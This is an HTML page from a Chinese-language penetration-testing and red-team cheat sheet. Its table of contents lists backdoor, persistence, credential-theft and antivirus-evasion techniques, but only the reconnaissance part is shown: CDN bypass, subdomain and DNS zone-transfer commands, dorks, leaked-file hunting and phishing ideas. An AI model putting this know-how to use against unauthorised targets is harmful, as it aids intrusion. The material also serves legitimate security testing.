href="#ssf">SSF</a><ul><li><a href="#%E6%AD%A3%E5%90%91socks%E4%BB%A3%E7%90%86">正向socks代理</a></li><li><a href="#%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86">反向socks代理</a></li><li><a href="#%E5%A4%9A%E7%BA%A7%E7%BA%A7%E8%81%94">多级级联</a></li><li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li></ul></li><li><a href="#shadowsocks">Shadowsocks</a></li><li><a href="#goproxy">Goproxy</a></li><li><a href="#chisel">Chisel</a></li><li><a href="#%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6">代理软件</a></li></ul></li><li><a href="#ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F">Ngrok内网穿透</a></li><li><a href="#ms17-010">MS17-010</a></li><li><a href="#ms08_067">MS08_067</a></li><li><a href="#%E6%94%BB%E5%87%BBmysql%E6%95%B0%E6%8D%AE%E5%BA%93">攻击MySQL数据库</a></li><li><a href="#%E6%94%BB%E5%87%BBmssql%E6%95%B0%E6%8D%AE%E5%BA%93">攻击MSSQL数据库</a></li><li><a href="#%E9%9A%94%E7%A6%BB%E4%B8%BB%E6%9C%BApayload">隔离主机payload</a></li><li><a href="#%E7%88%86%E7%A0%B4">爆破</a><ul><li><a href="#hydra">Hydra</a></li><li><a href="#medusa">Medusa</a></li><li><a href="#%E5%9F%9F%E5%86%85%E7%88%86%E7%A0%B4">域内爆破</a><ul><li><a href="#kerbrute">Kerbrute</a></li><li><a href="#domainpasswordspray">DomainPasswordSpray</a></li></ul></li></ul></li><li><a href="#%E6%96%B9%E7%A8%8B%E5%BC%8F%E5%86%85%E7%BD%91%E4%B8%8D%E4%BA%A7%E7%94%9Fsession">方程式内网不产生session</a></li><li><a href="#kerberoasting">Kerberoasting</a><ul><li><a href="#spn%E5%8F%91%E7%8E%B0">SPN发现</a><ul><li><a href="#cmd">cmd</a></li><li><a href="#powershell">Powershell</a></li><li><a href="#empire">Empire</a></li></ul></li><li><a href="#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE">申请票据</a></li><li><a href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE">导出票据</a></li><li><a href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81">破解密码</a></li><li><a href="#%E9%87%8D%E5%86%99%E7%A5%A8%E6%8D%AE">重写票据</a></li><li><a href="#getuserspns">GetUserSPNs</a></li></ul></li><li><a href="#aseproasting">ASEPRoasting</a></li><li><a href="#pass-the-hash">PASS-THE-HASH</a><ul><li><a href="#wmiexec--thehash">WMIExec &amp; TheHash</a></li><li><a href="#wmi">WMI</a><ul><li><a href="#wmiexecpy">wmiexec.py</a></li><li><a href="#wmiexecvbs">wmiexec.vbs</a></li><li><a href="#powershell">Powershell</a></li></ul></li><li><a href="#psexec">Psexec</a></li><li><a href="#mimikatz">Mimikatz</a></li><li><a href="#pth-winexe">pth-winexe</a></li><li><a href="#smbexec">Smbexec</a></li></ul></li><li><a href="#pass-the-ticket">PASS-THE-TICKET</a><ul><li><a href="#%E5%90%8D%E8%AF%8D">名词</a></li><li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEmimikatz">黄金票据+Mimikatz</a></li><li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEmimikatz">白银票据+Mimikatz</a></li><li><a href="#ms14-068">MS14-068</a></li><li><a href="#mimikatzmsf">Mimikatz+MSF</a></li><li><a href="#goldenpacpy">goldenPac.py</a></li></ul></li><li><a href="#%E8%B4%A6%E6%88%B7%E5%A7%94%E6%B4%BE">账户委派</a><ul><li><a href="#%E8%B4%A6%E6%88%B7%E9%9D%9E%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">账户非受限委派</a></li><li><a href="#%E8%B4%A6%E6%88%B7%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">账户受限委派</a></li></ul></li><li><a href="#%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">资源受限委派</a></li><li><a href="#cve-2019-0708">CVE-2019-0708</a></li><li><a href="#ntlm%E4%B8%AD%E7%BB%A7">NTLM中继</a><ul><li><a href="#ntlmrelayx%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">Ntlmrelayx+资源受限委派</a></li><li><a href="#responder">Responder</a><ul><li><a href="#smb%E5%8D%8F%E8%AE%AE%E6%88%AA%E8%8E%B7">SMB协议截获</a></li><li><a href="#wpad%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97">WPAD代理欺骗</a></li><li><a href="#web%E6%BC%8F%E6%B4%9E">Web漏洞</a></li><li><a href="#%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB">中继攻击</a></li><li><a href="#ntlmv2hash%E7%A0%B4%E8%A7%A3">NTLMv2Hash破解</a></li></ul></li></ul></li><li><a href="#gpp-password">GPP-Password</a></li><li><a href="#winrm%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C">WinRM无文件执行</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E5%91%BD%E4%BB%A4">添加域管命令</a></li><li><a href="#ssh%E5%AF%86%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95">SSH密钥免密登录</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E4%BF%9D%E5%AD%98%E7%9A%84rdp%E5%AF%86%E7%A0%81">获取保存的RDP密码</a></li></ul></li><li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">后门&amp;持久化</a><ul><li><a href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7">影子用户</a></li><li><a href="#rid%E5%8A%AB%E6%8C%81">RID劫持</a></li><li><a href="#guest%E6%BF%80%E6%B4%BB">Guest激活</a></li><li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">映像劫持</a><ul><li><a href="#sethc">Sethc</a></li><li><a href="#%E8%BD%BB%E6%9D%BE%E4%BD%BF%E7%94%A8">轻松使用</a></li><li><a href="#ifeo%E9%9D%99%E9%BB%98%E6%89%A7%E8%A1%8C">IFEO静默执行</a></li></ul></li><li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">注册表启动项</a><ul><li><a href="#msf">MSF</a></li><li><a href="#cmd">CMD</a></li></ul></li><li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a><ul><li><a href="#%E5%8A%A0%E8%BD%BDpowershell">加载powershell</a></li><li><a href="#%E6%89%A7%E8%A1%8Cexe">执行exe</a></li></ul></li><li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">进程注入</a><ul><li><a href="#appcertdlls">AppCertDlls</a></li><li><a href="#appinit_dlls">AppInit_DLLs</a></li><li><a href="#msf">MSF</a></li></ul></li><li><a href="#%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96">登录初始化</a><ul><li><a href="#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F">屏幕保护程序</a></li></ul></li><li><a href="#mof">MOF</a></li><li><a href="#winrm%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">WinRM端口复用</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1">创建服务</a></li><li><a href="#bitadmin">Bitadmin</a></li><li><a href="#clr-injection">CLR Injection</a></li><li><a href="#com-object-hijacking">COM OBJECT hijacking</a><ul><li><a href="#caccpropservicesclass-and-mmdeviceenumerato">CAccPropServicesClass and MMDeviceEnumerato</a></li><li><a href="#explorer">Explorer</a></li></ul></li><li><a href="#squibledoo">Squibledoo</a></li><li><a href="#dll%E5%8A%AB%E6%8C%81">DLL劫持</a><ul><li><a href="#%E5%8A%AB%E6%8C%811">劫持1</a></li><li><a href="#%E5%8A%AB%E6%8C%812">劫持2</a></li><li><a href="#msdtc%E6%9C%8D%E5%8A%A1%E5%8A%AB%E6%8C%81">MSDTC服务劫持</a></li><li><a href="#rattler">Rattler</a></li></ul></li><li><a href="#dll%E4%BB%A3%E7%90%86%E5%8A%AB%E6%8C%81%E5%8F%B3%E9%94%AE">DLL代理劫持右键</a></li><li><a href="#%E4%BD%BF%E7%94%A8amsi%E6%89%AB%E6%8F%8F%E6%8E%A5%E5%8F%A3%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">使用AMSI扫描接口维持权限</a></li><li><a href="#dll%E5%8A%AB%E6%8C%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">DLL劫持计划任务</a></li><li><a href="#dll%E6%B3%A8%E5%85%A5">DLL注入</a><ul><li><a href="#powershell">Powershell</a></li><li><a href="#injectproc">InjectProc</a></li></ul></li><li><a href="#%E9%80%9A%E8%BF%87%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">通过控制面板加载项维持权限</a></li><li><a href="#%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89net%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%BF%9B%E8%A1%8CDLL%E6%B3%A8%E5%85%A5">通过自定义.net垃圾回收机制进行DLL注入</a></li><li><a href="#windows-fax-dll-injection">Windows FAX DLL Injection</a></li><li><a href="#dsrm%E6%B3%A8%E5%86%8C%E8%A1%A8acl%E5%90%8E%E9%97%A8">DSRM+注册表ACL后门</a></li><li><a href="#dcshadowsid-history">DCShadow&amp;SID History</a></li><li><a href="#dcsync%E5%90%8E%E9%97%A8">DCSync后门</a></li><li><a href="#netsh-helper-dll">Netsh Helper DLL</a><ul><li><a href="#msfvenom%E7%94%9F%E6%88%90dll">MSFvenom生成DLL</a></li><li><a href="#msfweb_delivery">MSF+web_delivery</a></li><li><a href="#msfshellcode">MSF&amp;Shellcode</a></li></ul></li><li><a href="#mssql%E5%90%8E%E9%97%A8">MSSQL后门</a></li><li><a href="#nssm">NSSM</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E7%AD%BE%E5%90%8D">添加签名</a></li><li><a href="#metsvc">Metsvc</a></li><li><a href="#persistence">Persistence</a></li><li><a href="#hookpasswordchangenotify">HookPasswordChangeNotify</a></li><li><a href="#nppspy%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81">NPPSpy记录密码</a></li><li><a href="#password-filter-dll">Password Filter DLL</a></li><li><a href="#wmic%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85">WMIC事件订阅</a></li><li><a href="#wmi-persistence">WMI-Persistence</a></li><li><a href="#invoke-tasksbackdoor">Invoke-Tasksbackdoor</a></li><li><a href="#invoke-adsbackdoor">Invoke-ADSBackdoor</a></li><li><a href="#ads%E9%9A%90%E8%97%8Fwebshell">ADS隐藏webshell</a></li><li><a href="#adsjavascript">ADS&amp;JavaScript</a></li><li><a href="#empire">Empire</a><ul><li><a href="#lnk%E5%90%8E%E9%97%A8">LNK后门</a></li><li><a href="#wmi">WMI</a></li></ul></li><li><a href="#%E6%B3%A8%E5%85%A5ssp%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81">注入SSP被动收集密码</a><ul><li><a href="#mimikatz">Mimikatz</a></li><li><a href="#empire">Empire</a></li><li><a href="#powersploit">Powersploit</a></li></ul></li><li><a href="#%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%AD%96%E7%95%A5%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%90%8E%E9%97%A8">基于域策略文件权限后门</a></li><li><a href="#kerberoasting%E5%90%8E%E9%97%A8">Kerberoasting后门</a></li><li><a href="#s4u2self%E5%90%8E%E9%97%A8">S4U2Self后门</a></li><li><a href="#%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE%E5%90%8E%E9%97%A8">受限委派后门</a></li><li><a href="#skeleton-key%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99">Skeleton Key万能钥匙</a></li><li><a href="#%E5%94%AF%E4%B8%80ip%E8%AE%BF%E9%97%AE">唯一IP访问</a></li><li><a href="#linux-cron%E5%90%8E%E9%97%A8">Linux cron后门</a></li><li><a href="#strace%E8%AE%B0%E5%BD%95ssh%E5%AF%86%E7%A0%81">Strace记录ssh密码</a></li><li><a href="#sshd%E5%90%8E%E9%97%A8">SSHD后门</a></li><li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">进程注入</a></li><li><a href="#ssh-wrapper%E5%90%8E%E9%97%A8">SSH wrapper后门</a></li><li><a href="#suid-shell">SUID Shell</a></li><li><a href="#ssh%E5%85%AC%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95">SSH公私钥登录</a></li><li><a href="#reptile">Reptile</a></li><li><a href="#kbeast_rootkit">Kbeast_rootkit</a></li><li><a href="#openssh%E5%90%8E%E9%97%A8">OpenSSH后门</a></li><li><a href="#iptables%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">IPTables端口复用</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">文件处理</a></li><li><a href="#iis_bin_backdoor">IIS_Bin_Backdoor</a></li><li><a href="#iis_netdll_spy">IIS_NETDLL_Spy</a></li><li><a href="#iis_raid">IIS_RAID</a></li><li><a href="#java-web-backdoor">JAVA Web Backdoor</a></li><li><a href="#tomcat-jsp-hideshell">Tomcat JSP HideShell</a></li><li><a href="#apache-module%E5%90%8E%E9%97%A81">Apache Module后门1</a></li><li><a href="#apache-module%E5%90%8E%E9%97%A82">Apache Module后门2</a></li><li><a href="#apache-module%E5%90%8E%E9%97%A83">Apache Module后门3</a></li><li><a href="#nginx-lua%E5%90%8E%E9%97%A8">Nginx Lua后门</a></li><li><a href="#pwnnginx">PwnNginx</a></li></ul></li></ul></li><li><p><a href="#%E6%B8%97%E9%80%8F%E5%92%8C%E7%BA%A2%E9%98%9Ftips">渗透和红队tips</a></p><ul><li><a href="#%E7%88%B6%E8%BF%9B%E7%A8%8B%E7%A0%B4%E5%9D%8F">父进程破坏</a></li><li><a href="#lot%E9%AB%98%E9%A2%91%E7%8E%87%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">loT高频率账户密码</a></li><li><a href="#bypass-mod_security">Bypass mod_security</a></li><li><a href="#%E6%9F%A5%E6%89%BEgit%E5%92%8Csvn%E7%9A%84%E5%AD%97%E5%85%B8">查找git和svn的字典</a></li><li><a href="#top-25-%E9%87%8D%E5%AE%9A%E5%90%91dorks">Top 25 重定向dorks</a></li><li><a href="#%E4%BD%BF%E7%94%A8grep%E5%BF%AB%E9%80%9F%E5%8E%BB%E9%99%A4%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">使用grep快速去除垃圾数据</a></li><li><a href="#%E5%B7%B2%E6%B3%84%E9%9C%B2%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B4%E7%90%86%E5%87%BA%E7%9A%84%E5%AD%97%E5%85%B8">已泄露的密码整理出的字典</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5bypass">命令注入Bypass</a></li><li><a href="#%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8heartbleed%E6%BC%8F%E6%B4%9E">查询是否存在heartbleed漏洞</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6">远程解压文件</a></li><li><a href="#top25-ssrf-dorks">Top25 ssrf dorks</a></li><li><a href="#%E4%BD%BF%E7%94%A8securitytrails-api%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D">使用SecurityTrails API查询子域名</a></li><li><a href="#%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80payload">邮件地址payload</a></li><li><a href="#web-server%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%91%BD%E4%BB%A4">Web server日志分析命令</a></li><li><a href="#bypass-amsi">Bypass AMSI</a></li><li><a href="#bypass-amsi-2">Bypass AMSI 2</a></li><li><a href="#cve-2020-5902">CVE-2020-5902</a></li><li><a href="#%E4%B8%80%E4%BA%9B%E5%8F%AF%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E6%89%A7%E8%A1%8C">一些可尝试绕过白名单的执行</a></li><li><a href="#%E7%BB%95%E8%BF%87lsa-protection">绕过lsa protection</a></li><li><a href="#pezor%E5%85%8D%E6%9D%80">Pezor免杀</a></li><li><a href="#%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91">动态调用进程注入逻辑</a></li><li><a href="#%E5%9C%A8windows-server-2016%E5%92%8C2019%E4%B8%AD%E7%BB%95%E8%BF%87windows-defender">在Windows Server 2016和2019中绕过Windows Defender</a></li><li><a href="#%E5%86%85%E5%AD%98%E4%B8%AD%E8%A7%A3%E7%A0%81shellcode%E7%BB%95%E8%BF%87av">内存中解码shellcode绕过av</a></li><li><a href="#cshot-shellcode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8">cshot shellcode远程加载器</a></li><li><a href="#thinkphp%E6%B8%97%E9%80%8F%E6%89%8B%E6%AE%B5">thinkphp渗透手段</a></li><li><a href="#%E4%BD%BF%E7%94%A8windows-defender%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">使用windows defender下载文件</a></li><li><a href="#powershell%E8%84%9A%E6%9C%AC%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87amsi%E5%92%8Cav">Powershell脚本混淆绕过amsi和av</a></li><li><a href="#%E9%80%9A%E8%BF%87%E6%8C%82%E8%B5%B7eventLog%E6%9C%8D%E5%8A%A1%E7%BA%BF%E7%A8%8B%E7%A6%81%E7%94%A8windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97">通过挂起EventLog服务线程禁用Windows事件日志</a></li><li><a href="#dedecms">dedecms</a></li><li><a href="#dedecms%E5%89%8D%E5%8F%B0%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81">dedecms前台重置任意管理员密码</a></li><li><a href="#shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Shiro rememberMe反序列化漏洞</a></li><li><a href="#shiro-padding-oracle-attack">Shiro Padding Oracle Attack</a></li><li><a href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87">shiro权限绕过</a></li><li><a href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E">编辑器漏洞</a></li><li><a href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEphpmyadmin">宝塔面板未授权访问phpmyadmin</a></li><li><a href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D">深信服</a></li><li><a href="#%E4%BB%8Elfi%E5%88%B0rce">从LFI到RCE</a></li><li><a href="#%E9%9A%90%E8%97%8Fwindows%E6%9C%8D%E5%8A%A1">隐藏windows服务</a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2>站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入<h2 id="网站IP"><a href="#网站IP" class="headerlink" title="网站IP"></a>网站IP</h2><h3 id="是否存在CDN"><a href="#是否存在CDN" class="headerlink" title="是否存在CDN"></a>是否存在CDN</h3>Ping、多地ping、国外ping<h3 id="Bypass-cdn常规方式"><a href="#Bypass-cdn常规方式" class="headerlink" title="Bypass cdn常规方式"></a>Bypass cdn常规方式</h3>子域名<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>Ping根域名<br>Nslookup<br>Cloudflare的真实IP寻找<br><a href="http://crimeflare.org:82/cfs.html">http://crimeflare.org:82/cfs.html</a><br><a href="https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py">https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py</a><br>查找老域名<br>查找关联域名<br><a href="http://www.baidu.com/">www.baidu.com</a><br><a href="http://www.baidu.cn/">www.baidu.cn</a><br><a href="http://www.baidu.org/">www.baidu.org</a><br><a href="http://www.baidu.xyz等等/">www.baidu.xyz等等</a><br>信息泄露/配置文件<br>Phpinfo<br>网页源码<br>Svn<br>Github<br>Shodan/fofa/zoomeye<br>SSL证书记录<br><a href="https://censys.io/">https://censys.io/</a><br>网站漏洞<br>Xss<br>Ssrf<br>命令执行<br>SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)<br>DNS记录，证书记录<br>设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址<br>RSS订阅/邮件头<br>APP反编译搜索/截取APP的请求信息<br>修改hosts文件指向<h2 id="域名历史IP"><a href="#域名历史IP" class="headerlink" title="域名历史IP"></a>域名历史IP</h2><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><h2 id="网站架构-服务器指纹-CMS识别-容器"><a href="#网站架构-服务器指纹-CMS识别-容器" class="headerlink" title="网站架构/服务器指纹/CMS识别/容器"></a>网站架构/服务器指纹/CMS识别/容器</h2>Whatweb<br>网页源代码<br>请求头/响应头<br>网站底部，顶部，左上角右上角<br>网站报错信息<br><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a><br>域名/install<br>Firefox插件Wappalyzer<br>CMS漏洞<br>定位版本对应已知漏洞检查<br>CMS未知漏洞挖掘<br>Web容器已知漏洞(解析漏洞这种)<br>显示网站使用的技术<br><a href="https://builtwith.com/">https://builtwith.com/</a><br>中间件、组件<br>Weblogic、tomcat、zabbix、struts、axis等<br><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2>老站、同样架构或同源码的子站<br>爆破，接口查询<br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br><a href="https://d.chinacycc.com/index.php?m=Login&amp;a=index">https://d.chinacycc.com/index.php?m=Login&amp;a=index</a><br>subDomainBrute、knockpy<br>OWA发现、dig adfs、dig mail<br><a href="https://dns.bufferover.run/dns?q=baidu.com">https://dns.bufferover.run/dns?q=baidu.com</a><br><a href="http://api.hackertarget.com/reversedns/?q=target.com">http://api.hackertarget.com/reversedns/?q=target.com</a><h2 id="网站使用的CMS的官方demo站"><a href="#网站使用的CMS的官方demo站" class="headerlink" title="网站使用的CMS的官方demo站"></a>网站使用的CMS的官方demo站</h2>找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。<h2 id="SSL证书信息"><a href="#SSL证书信息" class="headerlink" title="SSL证书信息"></a>SSL证书信息</h2><a href="https://crt.sh/?q=%25.target.com">https://crt.sh/?q=%25.target.com</a><br><a href="https://censys.io/certificates?q=target.com">https://censys.io/certificates?q=target.com</a><br><a href="https://github.com/cheetz/sslScrape">https://github.com/cheetz/sslScrape</a><h2 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h2><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://censys.io/">https://censys.io/</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a><br>域传送漏洞检查<br>Dnsenum、fierce<br><a href="http://ha.ckers.org/fierce/">http://ha.ckers.org/fierce/</a><br>$ ./fierce.pl -dns example.com<br>$ ./fierce.pl –dns example.com –wordlist myWordList.txt<blockquote><p>dig @ns.example.com example=.com AXFR<br>nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器<br>nslookup #进入nslookup交互模式<br>server dns.domian.com #指定dns服务器<br>ls xxx.yyy.cn #列出域信息</p></blockquote><h2 id="同服站点情况"><a href="#同服站点情况" class="headerlink" title="同服站点情况"></a>同服站点情况</h2><a href="https://site.ip138.com/">https://site.ip138.com/</a><br>火狐插件flagfox,配置单击指向bing查ip对应的域名<h2 id="同样架构或源码的站"><a href="#同样架构或源码的站" class="headerlink" title="同样架构或源码的站"></a>同样架构或源码的站</h2><h2 id="网站js"><a href="#网站js" class="headerlink" title="网站js"></a>网站js</h2><a href="https://github.com/003random/getJS">https://github.com/003random/getJS</a><br><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>或浏览器F12也可以看到加载的<br>敏感信息、可能存在漏洞的参数等信息<br>查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等<h2 id="网站使用的第三方js"><a href="#网站使用的第三方js" class="headerlink" title="网站使用的第三方js"></a>网站使用的第三方js</h2><h2 id="云信息"><a href="#云信息" class="headerlink" title="云信息"></a>云信息</h2>Aliyun、AWS、GCP、Azure等<br>查找可公开访问的实例<br><a href="https://github.com/gwen001/s3-buckets-finder">https://github.com/gwen001/s3-buckets-finder</a><br><a href="https://github.com/nccgroup/aws-inventory">https://github.com/nccgroup/aws-inventory</a><br><a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a><h2 id="APP反编译"><a href="#APP反编译" class="headerlink" title="APP反编译"></a>APP反编译</h2>url、js、osskey、api等信息查找<br>搜集到接口该怎么做<br>Fuzz常见参数<h2 id="C段-B段信息"><a href="#C段-B段信息" class="headerlink" title="C段/B段信息"></a>C段/B段信息</h2>Banner、是否存在目标的后台或其他入口/其他业务系统<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2>recon-ng,theharvester,maltego,exiftool等<br><a href="https://www.spiderfoot.net/">https://www.spiderfoot.net/</a><br><a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a><h2 id="端口对外开放情况"><a href="#端口对外开放情况" class="headerlink" title="端口对外开放情况"></a>端口对外开放情况</h2>Masscan、scanport等<br>针对常见的那些端口的利用的常规方法<br>常见的未授权访问的服务如redis，mongodb等<h2 id="目录扫描-爬虫-慎用"><a href="#目录扫描-爬虫-慎用" class="headerlink" title="目录扫描/爬虫(慎用)"></a>目录扫描/爬虫(慎用)</h2><h2 id="WAF情况识别"><a href="#WAF情况识别" class="headerlink" title="WAF情况识别"></a>WAF情况识别</h2><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>做好绕过策略的计划<h2 id="随手测试"><a href="#随手测试" class="headerlink" title="随手测试"></a>随手测试</h2>单引号<br>xx.jpg/.php<br>admin/123456<br>万能密码<br>Heartbleed漏洞<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2>Google自定义搜索引擎整合的300多个社交网站<br><a href="https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22">https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22</a><br>Google自定义搜索引擎整合的文件共享网站<br><a href="https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22">https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22</a><br>领英用户提取<br><a href="https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme">https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme</a><h2 id="Shodan-fofa-zoomeye"><a href="#Shodan-fofa-zoomeye" class="headerlink" title="Shodan/fofa/zoomeye"></a>Shodan/fofa/zoomeye</h2><h2 id="Google-dorks"><a href="#Google-dorks" class="headerlink" title="Google dorks"></a>Google dorks</h2>Site,filetype,intitle,inurl,intext等<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2>电话、邮箱，姓名<br>目录遍历<br>备份文件<br>(<a href="http://www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip/">www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip</a>)<br>.svn/.git/sql/robots/crossdomin.xml/DS_Store等<br><a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br><a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a><br>若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典<br>网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)<h2 id="网页缓存"><a href="#网页缓存" class="headerlink" title="网页缓存"></a>网页缓存</h2><a href="http://www.cachedpages.com/">http://www.cachedpages.com/</a><h2 id="图片反查"><a href="#图片反查" class="headerlink" title="图片反查"></a>图片反查</h2>百度识图、googleimage、tineye<br>原图查询坐标<h2 id="社交"><a href="#社交" class="headerlink" 